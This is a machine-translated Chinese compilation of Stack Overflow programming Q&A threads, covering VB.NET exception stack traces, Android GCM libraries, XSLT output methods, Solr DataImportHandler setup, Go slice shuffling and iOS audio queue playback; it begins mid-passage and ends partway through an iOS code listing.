如果您不仔细调整查询以仅导致单个 LINQ，则所有 LINQ 都可能导致，如果`SELECT`不“放弃”，在单个查询中检索更大的结果，然后使用 Linq-to- 这可能是不可能的用于聚合或以其他方式操作数据的对象。[例如这个“查询”](https://stackoverflow.com/a/12689544/256431)。

因此，通常由程序员来确保围绕可能导致多个查询的 LINQ 查询添加事务。我们只需要确定哪些 LINQ 查询可以转换为多个 SQL 查询。*

# .net - 获取导致捕获异常的调用方法

> ID：12264754
> 
> 赞同：0
> 
> 时间：2012-09-04T13:40:06.093
> 
> 标签：.net, vb.net

我正在处理 Windows 窗体的主入口点中的顶级异常。我想访问在我的处理程序中导致异常的调用方法/程序集。我有一种感觉，我将不得不为此使用跟踪，但我不确定在哪里。

```
Module Program
  Sub Main()
    Try
      AddHandler AppDomain.CurrentDomain.UnhandledException, Function(sender, e) ExceptionHandler.Handle(sender, DirectCast(e.ExceptionObject, Exception))
      AddHandler Application.ThreadException, Function(sender, e) ExceptionHandler.Handle(sender, e.Exception)
      Application.Run(ApplicationBase)
    Catch ex As Exception
      MessageBox.Show("Handled Exception")
    End Try
  End Sub
End Module

Public Class ApplicationBase
  Public Sub MethodA()
    'Causes an exception
    File.ReadAllLines("")
  End Sub
End Class

Public Class ExceptionHandler

  Public Shared Function Handle(sender As Object, e As Exception)
    Dim t As Type = sender.GetType()
    'Retrieve the calling method here?
    Dim callingMethod = "MethodA"
    Return True
  End Function

End Class 
```

作为发送者通过的对象是一个线程，我试图查看这是否是调用导致异常的程序集/对象类型。

我的问题是，如果可能的话，如何从“句柄”方法中获取方法名称/信息并推送对象名称/程序集？

编辑：

虽然 e.ToString() 将显示方法名称 - 我正在寻找对方法信息列表/程序集/引发异常的类型（如反射）的访问，然后我可以获得 .DLL 的版本号等 -我可能在这里做梦，但我想知道这是否可能？

编辑2：

我尝试了 e.TargetSite，它对于 MethodA() 异常返回 File.ReadAllLines() 的方法信息我正在寻找导致异常的 Class 方法，因此方法信息将是 MethodA - 虽然这比我要接近得多我想我会得到。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:48:49.633

如果您想知道哪个方法引发了异常，您可以使用[Exception.TargetSite](http://msdn.microsoft.com/en-us/library/system.exception.targetsite.aspx)属性；它返回一个`MethodBase`.

> 如果引发此异常的方法不可用并且堆栈跟踪不是空引用（在 Visual Basic 中为 Nothing），TargetSite 从堆栈跟踪中获取该方法。如果堆栈跟踪是一个空引用，TargetSite 也会返回一个空引用。

如果您想在异常发生时遍历堆栈跟踪以查找代码中的方法（而不是库代码中的方法），您将必须自己分析堆栈跟踪。

您可以获得异常的堆栈跟踪：

```
Dim stackTrace = new StackTrace(ex) 
```

您可以按索引获取单个堆栈帧：

```
Dim stackFrame = stackTrace.GetFrame(index) 
```

您可以从堆栈帧中获取信息：

```
Dim method = stackFrame.GetMethod() 
```

然后，您必须提出一种算法，从上到下遍历堆栈跟踪，寻找满足您的标准的第一帧作为您要报告的堆栈帧。这是一个非常简单的算法，可以找到执行程序集中的第一帧。

```
Dim stackTrace = new StackTrace(ex)
Dim i As Integer
For i = 0 To stackTrace.FrameCount - 1
  Dim stackFrame = stackTrace.GetFrame(i)
  Dim method = stackFrame.GetMethod()
  If (method.DeclaringType.Assembly = Assembly.GetExecutingAssembly()) Then
    ' Found the method - do something and exit the loop
    Exit For
  End If
Next i 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:42:19.273

`e.ToString()`将返回完整的详细信息，包括堆栈跟踪。堆栈跟踪包括所有方法名称。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:47:46.187

[已编辑]

看看[如何在 C# 中格式化异常的堆栈跟踪？](https://stackoverflow.com/questions/2372186/how-to-format-exceptions-stack-trace-in-c). 使用接受异常的[System.Diagnostics.StackTrace](http://msdn.microsoft.com/en-us/library/25h0kw08.aspx)的构造函数。

# android - 在 Eclipse IDE (Google Cloud Messaging) 中添加 gcm.jar

> ID：12264761
> 
> 赞同：13
> 
> 时间：2012-09-04T13:40:34.783
> 
> 标签：android, google-cloud-messaging

我有一个问题：我没有找到在哪里可以得到这个 Jar 文件 gcm.jar？我也可以把它放在哪里？注意我使用的是 Android 4.1。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-04T14:39:48.987

启动**SDK Manager**并向下滚动到“Extras”部分并确保您已安装**Google Cloud Messaging for Android Library**，如果没有，请安装该软件包。

该软件包将安装在目录“ `your-android-sdk\extras\google\gcm\`”

客户端代码（例如在 Android 应用中使用）：
`gcm\gcm-client\`

服务器代码（客户端连接并注册它的 regId）：
`gcm\gcm-server\`

要将 gcm client-jar (gcm.jar) 添加到您的 Android 项目中，请将其复制到 Eclipse 项目中的“ **libs** ”文件夹中，然后右键单击该文件并选择**Build Path --> Add to Build Path**。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-04-02T11:29:41.833

GCM Helper 库 (gcm.jar) 已被弃用。该库的文档 ( [https://developer.android.com/google/gcm/helper.html](https://developer.android.com/google/gcm/helper.html) ) 现在显示一条消息说明：

*本文档中的信息已被 GCM 服务器和 GCM 客户端取代。请使用 GoogleCloudMessaging API 而不是 GCM 客户端帮助程序库。GCM 服务器帮助程序库仍然有效。*

此处记录了实现 GCM 服务器：[https](https://developer.android.com/google/gcm/server.html) ://developer.android.com/google/gcm/server.html 现在此处记录了实现 GCM 客户端：[developer.android.com/google/gcm/client.html](http://developer.android.com/google/gcm/client.html)（对不起，不能作为链接发布，因为我没有足够的代表）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-01-21T11:27:55.433

截至今天，SDK Manager 现在可以选择“显示过时的包”（Packages->Show obsolete packages）。这允许您通过 SDK 管理器本身安装 GCM。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-02-12T12:49:50.317

转到此链接

[https://dl-ssl.google.com/android/repository/gcm_r03.zip](https://dl-ssl.google.com/android/repository/gcm_r03.zip)

下载完成后解压缩 zip 文件，您将获得三个目录，分别命名为客户端、服务器端和示例。

现在打开您的 SDK 文件夹并创建一个名为“extras/android”的文件夹并将所有三个文件夹粘贴到此处完成！

现在每当使用添加外部 jar 添加 gcm.jar 在项目类路径中创建一个新项目时。

[参考](https://stackoverflow.com/questions/11293424/android-sdk-manager-gcm-library)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-08-11T10:39:33.583

仅用于录制：我按照**chrkad提供的步骤操作，但我在****DIST**文件夹中找到了 .jar 文件，而***不是***在**JAR**文件夹中。在我发现这一点之后，我看到了**Peter Gluck**之前的帖子。

**我希望这可以节省一些时间来解决这个问题！（花了我 20 分钟）**

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-04-19T16:18:31.887

好像这个包现在已经过时了。为了在 SDK 管理器中看到它，我必须在“包”菜单中检查“显示过时的包”

从答案中查看详细信息

[https://stackoverflow.com/a/23092848/4255980](https://stackoverflow.com/a/23092848/4255980)

# html - xslt 中的 w3c 验证错误

> ID：12264780
> 
> 赞同：0
> 
> 时间：2012-09-04T13:41:41.943
> 
> 标签：html, xslt

我的 xsl 文件是这样的：

```
<img> 
     <xsl:attribute name="id">poster_<xsl:value-of select="position()"/></xsl:attribute>      
     <xsl:attribute name="alt"><xsl:value-of select="movie-title"/></xsl:attribute>     
     <xsl:attribute name="src"><xsl:value-of select="../poster-verylarge-image"/><xsl:value-of    select="movie-photo-name"/></xsl:attribute> 
</img> 
```

我收到一个 W3C 错误：

> 第 508 行，第 234 列：省略了“img”的结束标签，但指定了 OMITTAG NO
> ...artini.com/user_uploads/moviereview/420_265/7876579_1342029293_79940.jpeg">

请帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T08:00:50.993

虽然您没有显示完整的 XSLT 或输出 HTML，但我怀疑在您的 XSLT 文档中您已指定输出为 HTML

```
<xsl:output method="html" /> 
```

根据[W3C](http://www.w3.org/TR/1999/REC-xslt-19991116#output)网站：

> html 输出方法不应为空元素输出结束标记。对于 HTML 4.0，空元素是 area、base、basefont、br、col、frame、hr、img、input、isindex、link、meta 和 param。例如，以样式表形式`<br/>`或`<br></br>`在样式表中编写的元素应输出为`<br>`.

在您的小样本中，您正在输出一个图像标签，它可能会输出如下：

```
<img id="img1" src="test.html" alt="test"> 
```

如果您使用 W3C 验证器将文档验证为 XHTML，这将失败，因为图像标签未关闭。如果它是 XHTML 文档，则意味着 HTML 还必须符合格式良好的 XML 文档。

有很多方法可以解决这个问题。首先，如果你使用的是XSLT2.0，你可以指定一个xhtml的输出方法，这应该关闭标签

```
<xsl:output method="xhtml" /> 
```

或者，由于 XHTML 应该是格式良好的 XML，您可以只指定 xml 的输出方法。这仍将输出您需要的 HTML，但它也将是格式良好的 XML。

```
<xsl:output method="xml" /> 
```

但是，最好指定输出 html 的 doctype，以便 W3C 验证器确切地知道它正在验证的 HTML 版本。例如：

```
<xsl:output method="html" 
   doctype-public="-//W3C//DTD HTML 4.01 Transitional//EN" 
   doctype-system="http://www.w3.org/TR/html4/loose.dtd" /> 
```

执行此操作时，应验证带有非封闭标签的 HTML 文档

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><html>
<head>
<META http-equiv="Content-Type" content="text/html">
<title>Test</title></head>
<body><img id="img1" src="test.html" alt="test"></body>
</html> 
```

# solr - 使用 ZooKeeper 在 SolrCloud 中配置 DataImportHandler

> ID：12264783
> 
> 赞同：8
> 
> 时间：2012-09-04T13:41:53.727
> 
> 标签：solr, lucene, apache-zookeeper, solrcloud

我有一个 SolrCloud 配置如下：[探索 SolrCloud](http://outerthought.org/blog/491-ot.html)，不同之处在于我使用 Solr 4.0.0 Beta。很快的配置：

*   默认端口上的 ZooKeeper`2181`
*   在不同端口上运行的 3 个 Solr 实例

这仅用于测试目的。所需的配置是 3 个 ZooKeeper 实例（每个 Solr 实例一个）。我设法用 curl 命令索引了一些 XML 文件。

问题：

1.  如何配置 DIH/收集？我设法更改了 solrconfig.xml（dataimport-handler 的配置），在 lib 中添加了用于 DB 连接的正确驱动程序，但在 solr admin 中我得到“抱歉，没有定义 dataimport-handler！” 可以在 zookeeper 中查看更改（我看到了 data_config.xml），在 solr 管理面板中我可以看到 solrconfig.xml 的更新版本。

2.  对于 Ubuntu 12.04 LTS 在单台或多台机器上的 solrcloud 生产部署（使用 somthink 就像前面提到的所需配置）有什么好的教程吗？

任何意见，将不胜感激！提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-10-22T07:21:23.483

通常，DIH 配置与您在 solrCloud 配置中使用单个 Solr 实例还是多个实例无关。DIH 会将数据写入当前实例的 Lucene 索引中，然后由 zooKeeper 将其分散到其他实例上。

确保您的 DIH 配置正确：

在 solrconfig.xml 中，加载了所有必需的库。这意味着两个 DIH 罐子：

```
<lib dir="../../../dist/" regex="solr-dataimporthandler-4.3.0.jar" />
<lib dir="../../../dist/" regex="solr-dataimporthandler-extras-4.3.0.jar" /> 
```

以及您可能需要的其他 jars（如数据库 JDBC 驱动程序等）。

仍然在 solrconfig.xml 中确保声明了 DIH 处理程序，如下所示：

```
<requestHandler name="/dataimport" class="org.apache.solr.handler.dataimport.DataImportHandler">
    <lst name="defaults">
        <str name="config">data-config.xml</str>
    </lst>
</requestHandler> 
```

最后，您在 DIH 处理程序 (data-config.xml) 中声明的配置文件应该与 solrconfig.xml 位于相同的“conf”目录中，并且应该具有适当的内容，例如：

```
<dataConfig>

<dataSource type="JdbcDataSource" name="myDataSource" driver="oracle.jdbc.driver.OracleDriver" url="jdbc:oracle:thin:@someHost:1521:someDb" user="someUser" password="somePassword" batchSize="5000"/>  

<document name="myDoc" >
    <entity name="myDoc" dataSource="myDatasource" transformer="my.custom.Transformer" query="select col1, col2, col3 from table1 where whatever" />
</document>

</dataConfig> 
```

# arrays - Go中的随机数组

> ID：12264789
> 
> 赞同：93
> 
> 时间：2012-09-04T13:42:28.213
> 
> 标签：arrays, go

我试图将以下 Python 代码翻译成 Go

```
import random

list = [i for i in range(1, 25)]
random.shuffle(list)
print(list) 
```

但发现我的 Go 版本冗长且笨拙，因为没有 shuffle 功能，我必须实现接口和转换类型。

我的代码的惯用 Go 版本是什么？

* * *

## 回答 #1

> 赞同：108
> 
> 时间：2012-09-04T16:12:38.940

[dystroy 的回答](https://stackoverflow.com/a/12264918/510)是完全合理的，但也可以在不分配任何额外切片的情况下进行洗牌。

```
for i := range slice {
    j := rand.Intn(i + 1)
    slice[i], slice[j] = slice[j], slice[i]
} 
```

有关该算法的更多详细信息，请参阅[此 Wikipedia 文章](http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle)。`rand.Perm`实际上在内部也使用了这个算法。

* * *

## 回答 #2

> 赞同：99
> 
> 时间：2012-09-04T13:48:36.120

由于您的列表只是从 1 到 25 的整数，您可以使用[Perm](http://golang.org/pkg/math/rand/#Rand.Perm)：

```
list := rand.Perm(25)
for i, _ := range list {
    list[i]++
} 
```

请注意，使用 给出的排列`rand.Perm`是对任何数组进行洗牌的有效方法。

```
dest := make([]int, len(src))
perm := rand.Perm(len(src))
for i, v := range perm {
    dest[v] = src[i]
} 
```

* * *

## 回答 #3

> 赞同：59
> 
> 时间：2017-09-12T21:42:13.617

从 1.10 开始，Go 包含了官方的[Fisher-Yates shuffle](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle)函数。

文档：[`pkg/math/rand/#Shuffle`](https://tip.golang.org/pkg/math/rand/#Shuffle)

> ## 数学/兰德：添加随机播放
> 
> Shuffle 使用 Fisher-Yates 算法。
> 
> 由于这是新的 API，它为我们提供了使用更快的`Int31n`实现的机会，该实现主要避免了分裂。
> 
> 因此，尽管需要单独的初始化循环并使用函数调用来交换元素，但它`BenchmarkPerm30ViaShuffle`比 快约 30% 。`BenchmarkPerm30`

另见原始[CL 51891](https://go-review.googlesource.com/c/go/+/51891)

首先，正如[shellll所](https://stackoverflow.com/users/671580/shelll)[评论](https://stackoverflow.com/questions/12264789/shuffle-array-in-go/46185753?noredirect=1#comment105168476_46185753)的：

> 不要忘记随机播种，否则您将始终获得相同的订单。
> 例如`rand.Seed(time.Now().UnixNano())`

例子：

```
words := strings.Fields("ink runs from the corners of my mouth")
rand.Shuffle(len(words), func(i, j int) {
    words[i], words[j] = words[j], words[i]
})
fmt.Println(words) 
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2017-03-14T02:20:20.933

[Evan Shaw 的回答](https://stackoverflow.com/a/12267471/2775683)有一个小错误。如果我们从最低索引到最高索引遍历切片，以获得均匀（伪）随机洗牌，根据[同一篇文章](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle#The_modern_algorithm)，我们必须从区间`[i,n)` *中选择一个随机整数，而不是`[0,n+1)`*。

该实现将满足您对较大输入的需求，但对于较小的切片，它将执行非均匀洗牌。

要利用`rand.Intn()`，我们可以这样做：

```
 for i := len(slice) - 1; i > 0; i-- {
        j := rand.Intn(i + 1)
        slice[i], slice[j] = slice[j], slice[i]
    } 
```

遵循维基百科文章中的相同算法。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-05-03T18:46:22.617

也许您还可以使用以下功能：

```
func main() {
   slice := []int{10, 12, 14, 16, 18, 20}
   Shuffle(slice)
   fmt.Println(slice)
}

func Shuffle(slice []int) {
   r := rand.New(rand.NewSource(time.Now().Unix()))
   for n := len(slice); n > 0; n-- {
      randIndex := r.Intn(n)
      slice[n-1], slice[randIndex] = slice[randIndex], slice[n-1]
   }
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-05-30T18:17:42.133

使用库中的[Shuffle()](https://golang.org/pkg/math/rand/#Rand.Shuffle)`math/rand`。

这是一个例子：

```
package main

import (
    "fmt"
    "math/rand"
    "strings"
)

func main() {
    words := strings.Fields("ink runs from the corners of my mouth")
    rand.Shuffle(len(words), func(i, j int) {
        words[i], words[j] = words[j], words[i]
    })
    fmt.Println(words)
} 
```

由于它来自`math/rand`库，因此需要播种。有关更多详细信息，请参见[此处](https://stackoverflow.com/questions/12321133/golang-random-number-generator-how-to-seed-properly)。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-06-06T02:16:34.003

使用`math/rand`包时，别忘了设置源

```
// Random numbers are generated by a Source. Top-level functions, such as
// Float64 and Int, use a default shared Source that produces a deterministic
// sequence of values each time a program is run. Use the Seed function to
// initialize the default Source if different behavior is required for each run. 
```

所以我写了一个`Shuffle`考虑到这一点的函数：

```
import (
    "math/rand"
)

func Shuffle(array []interface{}, source rand.Source) {
    random := rand.New(source)
    for i := len(array) - 1; i > 0; i-- {
        j := random.Intn(i + 1)
        array[i], array[j] = array[j], array[i]
    }
} 
```

并使用它：

```
source := rand.NewSource(time.Now().UnixNano())
array := []interface{}{"a", "b", "c"}

Shuffle(array, source) // [c b a] 
```

如果你想使用它，你可以在这里找到它[https://github.com/shomali11/util](https://github.com/shomali11/util)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-07-24T06:35:39.163

[Raed 的方法](https://stackoverflow.com/a/44380373/7582250)`[]interface{}`因为作为输入而非常不灵活。这是**go>=1.8**更方便的版本：

```
func Shuffle(slice interface{}) {
    rv := reflect.ValueOf(slice)
    swap := reflect.Swapper(slice)
    length := rv.Len()
    for i := length - 1; i > 0; i-- {
            j := rand.Intn(i + 1)
            swap(i, j)
    }
} 
```

示例用法：

```
 rand.Seed(time.Now().UnixNano()) // do it once during app initialization
    s := []int{1, 2, 3, 4, 5}
    Shuffle(s)
    fmt.Println(s) // Example output: [4 3 2 1 5] 
```

而且，不要忘记[一点点复制比一点点依赖更好](https://www.youtube.com/watch?v=PAAkCSZUG1c&t=9m28s)

# android - 当视频在android中启动时如何隐藏媒体控制器？

> ID：12264796
> 
> 赞同：2
> 
> 时间：2012-09-04T13:42:49.890
> 
> 标签：android, video, back-button, mediacontroller

我正在尝试在媒体控制器设置为不可见的情况下播放视频，因此当我覆盖后退键时，视频停止并且活动结束。但是，当我在花费三秒钟之前按下后退按钮时，我需要按两次按钮，因为媒体控制器已激活。那么，如何在视频开始时隐藏媒体控制器呢？

```
private void playRecording() {
    MediaController mc = new MediaController(this);

    video_view.setMediaController(mc);
    video_view.setVideoPath(output_file_name);

    video_view.start();

    mc.show(0);
    mc.hide();
}

private void stopPlayingRecording() {
    video_view.stopPlayback();
}

@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
    if (keyCode == KeyEvent.KEYCODE_BACK) {
        if (is_playing) {
            stopPlayingRecording();
        }

        finish();
        return true;
    }
    return super.onKeyDown(keyCode, event);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:14:32.277

视频开始后，您可以尝试。

```
video_view.setMediaController(null); 
```

然后，如果您想在用户按下屏幕时再次显示它，您可以实现一个 ontouchevent 将创建一个并显示几秒钟，然后再次将其设置回 null

# ios - 为什么将 AVAssetReader 与音频队列一起使用时音频出现乱码

> ID：12264799
> 
> 赞同：4
> 
> 时间：2012-09-04T13:43:00.757
> 
> 标签：ios, audio, streaming

根据我的研究..人们一直说它是基于不匹配/错误的格式..但我对输入和输出都使用lPCM格式..你怎么会出错？我得到的结果只是噪音..（如白噪音）

我决定只粘贴我的整个代码..也许这会有所帮助：

```
#import "AppDelegate.h"
#import "ViewController.h"

@implementation AppDelegate

@synthesize window = _window;
@synthesize viewController = _viewController;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    // Override point for customization after application launch.
    self.viewController = [[ViewController alloc] initWithNibName:@"ViewController" bundle:nil];
    self.window.rootViewController = self.viewController;
    [self.window makeKeyAndVisible];
    // Insert code here to initialize your application

    player = [[Player alloc] init];

    [self setupReader];
    [self setupQueue];

    // initialize reader in a new thread    
    internalThread =[[NSThread alloc]
                     initWithTarget:self
                     selector:@selector(readPackets)
                     object:nil];

    [internalThread start];

    // start the queue. this function returns immedatly and begins
    // invoking the callback, as needed, asynchronously.
    //CheckError(AudioQueueStart(queue, NULL), "AudioQueueStart failed");

    // and wait
    printf("Playing...\n");
    do
    {
        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.25, false);
    } while (!player.isDone /*|| gIsRunning*/);

    // isDone represents the state of the Audio File enqueuing. This does not mean the
    // Audio Queue is actually done playing yet. Since we have 3 half-second buffers in-flight
    // run for continue to run for a short additional time so they can be processed
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, 2, false);

    // end playback
    player.isDone = true;
    CheckError(AudioQueueStop(queue, TRUE), "AudioQueueStop failed");

cleanup:
    AudioQueueDispose(queue, TRUE);
    AudioFileClose(player.playbackFile);

    return YES;

}

- (void) setupReader 
{
    NSURL *assetURL = [NSURL URLWithString:@"ipod-library://item/item.m4a?id=1053020204400037178"];   // from ilham's ipod
    AVURLAsset *songAsset = [AVURLAsset URLAssetWithURL:assetURL options:nil];

    // from AVAssetReader Class Reference: 
    // AVAssetReader is not intended for use with real-time sources,
    // and its performance is not guaranteed for real-time operations.
    NSError * error = nil;
    AVAssetReader* reader = [[AVAssetReader alloc] initWithAsset:songAsset error:&error];

    AVAssetTrack* track = [songAsset.tracks objectAtIndex:0];       
    readerOutput = [AVAssetReaderTrackOutput assetReaderTrackOutputWithTrack:track
                                                              outputSettings:nil];

    //    AVAssetReaderOutput* readerOutput = [[AVAssetReaderAudioMixOutput alloc] initWithAudioTracks:songAsset.tracks audioSettings:nil];

    [reader addOutput:readerOutput];
    [reader startReading];   

}

- (void) setupQueue
{

    // get the audio data format from the file
    // we know that it is PCM.. since it's converted    
    AudioStreamBasicDescription dataFormat;
    dataFormat.mSampleRate = 44100.0;
    dataFormat.mFormatID = kAudioFormatLinearPCM;
    dataFormat.mFormatFlags = kAudioFormatFlagIsBigEndian | kAudioFormatFlagIsSignedInteger | kAudioFormatFlagIsPacked;
    dataFormat.mBytesPerPacket = 4;
    dataFormat.mFramesPerPacket = 1;
    dataFormat.mBytesPerFrame = 4;
    dataFormat.mChannelsPerFrame = 2;
    dataFormat.mBitsPerChannel = 16;

    // create a output (playback) queue
    CheckError(AudioQueueNewOutput(&dataFormat, // ASBD
                                   MyAQOutputCallback, // Callback
                                   (__bridge void *)self, // user data
                                   NULL, // run loop
                                   NULL, // run loop mode
                                   0, // flags (always 0)
                                   &queue), // output: reference to AudioQueue object
               "AudioQueueNewOutput failed");

    // adjust buffer size to represent about a half second (0.5) of audio based on this format
    CalculateBytesForTime(dataFormat,  0.5, &bufferByteSize, &player->numPacketsToRead);

    // check if we are dealing with a VBR file. ASBDs for VBR files always have 
    // mBytesPerPacket and mFramesPerPacket as 0 since they can fluctuate at any time.
    // If we are dealing with a VBR file, we allocate memory to hold the packet descriptions
    bool isFormatVBR = (dataFormat.mBytesPerPacket == 0 || dataFormat.mFramesPerPacket == 0);
    if (isFormatVBR)
        player.packetDescs = (AudioStreamPacketDescription*)malloc(sizeof(AudioStreamPacketDescription) * player.numPacketsToRead);
    else
        player.packetDescs = NULL; // we don't provide packet descriptions for constant bit rate formats (like linear PCM)

    // get magic cookie from file and set on queue
    MyCopyEncoderCookieToQueue(player.playbackFile, queue);

    // allocate the buffers and prime the queue with some data before starting
    player.isDone = false;
    player.packetPosition = 0;
    int i;
    for (i = 0; i < kNumberPlaybackBuffers; ++i)
    {
        CheckError(AudioQueueAllocateBuffer(queue, bufferByteSize, &audioQueueBuffers[i]), "AudioQueueAllocateBuffer failed");    

        // EOF (the entire file's contents fit in the buffers)
        if (player.isDone)
            break;
    }   
}

-(void)readPackets
{

    // initialize a mutex and condition so that we can block on buffers in use.
    pthread_mutex_init(&queueBuffersMutex, NULL);
    pthread_cond_init(&queueBufferReadyCondition, NULL);

    state = AS_BUFFERING;

    while ((sample = [readerOutput copyNextSampleBuffer])) {

        AudioBufferList audioBufferList;
        CMBlockBufferRef CMBuffer = CMSampleBufferGetDataBuffer( sample ); 

        CheckError(CMSampleBufferGetAudioBufferListWithRetainedBlockBuffer(
                                                                           sample,
                                                                           NULL,
                                                                           &audioBufferList,
                                                                           sizeof(audioBufferList),
                                                                           NULL,
                                                                           NULL,
                                                                           kCMSampleBufferFlag_AudioBufferList_Assure16ByteAlignment,
                                                                           &CMBuffer
                                                                           ),
                   "could not read samples");

        AudioBuffer audioBuffer = audioBufferList.mBuffers[0];

        UInt32 inNumberBytes = audioBuffer.mDataByteSize;
        size_t incomingDataOffset = 0;

        while (inNumberBytes) {
            size_t bufSpaceRemaining;
            bufSpaceRemaining = bufferByteSize - bytesFilled;

            @synchronized(self)
            {
                bufSpaceRemaining = bufferByteSize - bytesFilled;
                size_t copySize;    

                if (bufSpaceRemaining < inNumberBytes)
                {
                    copySize = bufSpaceRemaining;             
                }
                else 
                {
                    copySize = inNumberBytes;
                }

                // copy data to the audio queue buffer
                AudioQueueBufferRef fillBuf = audioQueueBuffers[fillBufferIndex];
                memcpy((char*)fillBuf->mAudioData + bytesFilled, (const char*)(audioBuffer.mData + incomingDataOffset), copySize); 

                // keep track of bytes filled
                bytesFilled +=copySize;
                incomingDataOffset +=copySize;
                inNumberBytes -=copySize;      
            }

            // if the space remaining in the buffer is not enough for this packet, then enqueue the buffer.
            if (bufSpaceRemaining < inNumberBytes + bytesFilled)
            {
                [self enqueueBuffer];
            }

        }
    }

}

-(void)enqueueBuffer 
{
    @synchronized(self)
    {

        inuse[fillBufferIndex] = true;      // set in use flag
        buffersUsed++;

        // enqueue buffer
        AudioQueueBufferRef fillBuf = audioQueueBuffers[fillBufferIndex];
        NSLog(@"we are now enqueing buffer %d",fillBufferIndex);
        fillBuf->mAudioDataByteSize = bytesFilled;

        err = AudioQueueEnqueueBuffer(queue, fillBuf, 0, NULL);

        if (err)
        {
            NSLog(@"could not enqueue queue with buffer");
            return;
        }

        if (state == AS_BUFFERING)
        {
            //
            // Fill all the buffers before starting. This ensures that the
            // AudioFileStream stays a small amount ahead of the AudioQueue to
            // avoid an audio glitch playing streaming files on iPhone SDKs < 3.0
            //
            if (buffersUsed == kNumberPlaybackBuffers - 1)
            {

                err = AudioQueueStart(queue, NULL);
                if (err)
                {
                    NSLog(@"couldn't start queue");
                    return;
                }
                state = AS_PLAYING;
            }
        }

        // go to next buffer
        if (++fillBufferIndex >= kNumberPlaybackBuffers) fillBufferIndex = 0;
        bytesFilled = 0;        // reset bytes filled

    }

    // wait until next buffer is not in use
    pthread_mutex_lock(&queueBuffersMutex); 
    while (inuse[fillBufferIndex])
    {
        pthread_cond_wait(&queueBufferReadyCondition, &queueBuffersMutex);
    }
    pthread_mutex_unlock(&queueBuffersMutex);

}

#pragma mark - utility functions -

// generic error handler - if err is nonzero, prints error message and exits program.
static void CheckError(OSStatus error, const char *operation)
{
    if (error == noErr) return;

    char str[20];
    // see if it appears to be a 4-char-code
    *(UInt32 *)(str + 1) = CFSwapInt32HostToBig(error);
    if (isprint(str[1]) && isprint(str[2]) && isprint(str[3]) && isprint(str[4])) {
        str[0] = str[5] = '\'';
        str[6] = '\0';
    } else
        // no, format it as an integer
        sprintf(str, "%d", (int)error);

    fprintf(stderr, "Error: %s (%s)\n", operation, str);

    exit(1);
}

// we only use time here as a guideline
// we're really trying to get somewhere between 16K and 64K buffers, but not allocate too much if we don't need it/*
void CalculateBytesForTime(AudioStreamBasicDescription inDesc, Float64 inSeconds, UInt32 *outBufferSize, UInt32 *outNumPackets)
{

    // we need to calculate how many packets we read at a time, and how big a buffer we need.
    // we base this on the size of the packets in the file and an approximate duration for each buffer.
    //
    // first check to see what the max size of a packet is, if it is bigger than our default
    // allocation size, that needs to become larger

    // we don't have access to file packet size, so we just default it to maxBufferSize
    UInt32 maxPacketSize = 0x10000;

    static const int maxBufferSize = 0x10000; // limit size to 64K
    static const int minBufferSize = 0x4000; // limit size to 16K

    if (inDesc.mFramesPerPacket) {
        Float64 numPacketsForTime = inDesc.mSampleRate / inDesc.mFramesPerPacket * inSeconds;
        *outBufferSize = numPacketsForTime * maxPacketSize;
    } else {
        // if frames per packet is zero, then the codec has no predictable packet == time
        // so we can't tailor this (we don't know how many Packets represent a time period
        // we'll just return a default buffer size
        *outBufferSize = maxBufferSize > maxPacketSize ? maxBufferSize : maxPacketSize;
    }

    // we're going to limit our size to our default
    if (*outBufferSize > maxBufferSize && *outBufferSize > maxPacketSize)
        *outBufferSize = maxBufferSize;
    else {
        // also make sure we're not too small - we don't want to go the disk for too small chunks
        if (*outBufferSize < minBufferSize)
            *outBufferSize = minBufferSize;
    }
    *outNumPackets = *outBufferSize / maxPacketSize;
}

// many encoded formats require a 'magic cookie'. if the file has a cookie we get it
// and configure the queue with it
static void MyCopyEncoderCookieToQueue(AudioFileID theFile, AudioQueueRef queue ) {
    UInt32 propertySize;
    OSStatus result = AudioFileGetPropertyInfo (theFile, kAudioFilePropertyMagicCookieData, &propertySize, NULL);
    if (result == noErr && propertySize > 0)
    {
        Byte* magicCookie = (UInt8*)malloc(sizeof(UInt8) * propertySize);   
        CheckError(AudioFileGetProperty (theFile, kAudioFilePropertyMagicCookieData, &propertySize, magicCookie), "get cookie from file failed");
        CheckError(AudioQueueSetProperty(queue, kAudioQueueProperty_MagicCookie, magicCookie, propertySize), "set cookie on queue failed");
        free(magicCookie);
    }
}

#pragma mark - audio queue -

static void MyAQOutputCallback(void *inUserData, AudioQueueRef inAQ, AudioQueueBufferRef inCompleteAQBuffer) 
{
    AppDelegate *appDelegate = (__bridge AppDelegate *) inUserData;
    [appDelegate myCallback:inUserData
               inAudioQueue:inAQ 
        audioQueueBufferRef:inCompleteAQBuffer];

}

- (void)myCallback:(void *)userData 
      inAudioQueue:(AudioQueueRef)inAQ
